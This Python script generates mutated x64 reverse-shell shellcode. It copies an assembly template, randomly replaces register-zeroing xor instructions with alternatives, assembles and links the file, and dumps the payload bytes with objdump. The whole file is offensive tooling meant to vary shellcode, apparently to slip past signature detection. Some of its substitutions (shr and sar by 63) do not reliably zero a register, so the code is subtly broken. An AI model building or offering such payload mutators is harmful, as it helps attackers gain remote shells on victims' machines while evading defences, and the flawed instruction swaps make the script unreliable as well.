import random
import os

def main():
    # Create a new asm file based on a template of a reverse shell (x64)
    os.system("cp template.asm reverse.asm")
    
    file = 'reverse.asm'
    file_o = 'reverse.o'
    
    # Each fonction will change the lines which contains each register with "xor" instruction
    rax(file)
    rbx(file)
    rcx(file)
    rdx(file)

    # Compile and link the asm file 
    os.system("nasm -f elf64 -o %s %s && ld -o reverse %s" % (file_o, file, file_o))

    # Using objdump and parsing it to have the shellcode format, it will be save in a txt file
    commande = 'objdump -d reverse | grep "^ " | cut -f2 | awk \'{for(i=1;i<=NF;i++) printf "\\\\x%s",$i} END {print ""}\' > result.txt'
    os.system(commande)

    # Print the shellcode
    print(os.system("cat result.txt"))

# Each fonction contains the instruction to delete and an array with differents intructions that will replace the deleted one
def rax (file):
    delete = '  xor rax, rax'
    rax = ['  xor rax, rax', '  shr rax, 63', '  sub rax, rax', '  mov rax, 0xFFFFFFFFFFFFFFFF\n  add rax, 1', '  sar rax, 63']
    new = rax
    edit(file, delete, new)

def rbx(file):
    delete = '  xor rbx, rbx'
    rbx = ['  xor rbx, rbx', '  shr rbx, 63', '  sub rbx, rbx', '  mov rbx, 0xFFFFFFFFFFFFFFFF\n  add rbx, 1', '  sar rbx, 63']
    new = rbx
    edit(file, delete, new)

def rcx(file):
    delete = '  xor rcx, rcx'
    rcx = ['  xor rcx, rcx', '  shr rcx, 63', '  sub rcx, rcx', '  mov rcx, 0xFFFFFFFFFFFFFFFF\n  add rcx, 1', '  sar rcx, 63']
    new = rcx
    edit(file, delete, new)

def rdx(file):
    delete = '  xor rdx, rdx'
    rdx = ['  xor rdx, rdx', '  shr rdx, 63', '  sub rdx, rdx', '  mov rdx, 0xFFFFFFFFFFFFFFFF\n  add rdx, 1', '  sar rdx, 63']
    new = rdx
    edit(file, delete, new)



def edit(filename, deletedlines, newlines):
    try:
        with open(filename, 'r') as file:
            lines = file.readlines()

        # Search for the line that needs to be delete 
        deletedindex = [i for i, line in enumerate(lines) if line.strip() == deletedlines.strip()]

        # Edit all the lines that should replace the deleted instruction
        # Each lines will get a different instruction thanks to a randomizer
        for index in reversed(deletedindex):
            del lines[index]
            rand = random.randint(0, len(newlines)-1)
            lines.insert(index, newlines[rand] + '\n')

        # Writing in the file
        with open(filename, 'w') as file:
            file.writelines(lines)

        print("Successfull edit.")
    except FileNotFoundError:
        print(f"'{filename}' not founded.")
    except Exception as e:
        print(f"An error occured: {e}")

if __name__ == '__main__':
    main()
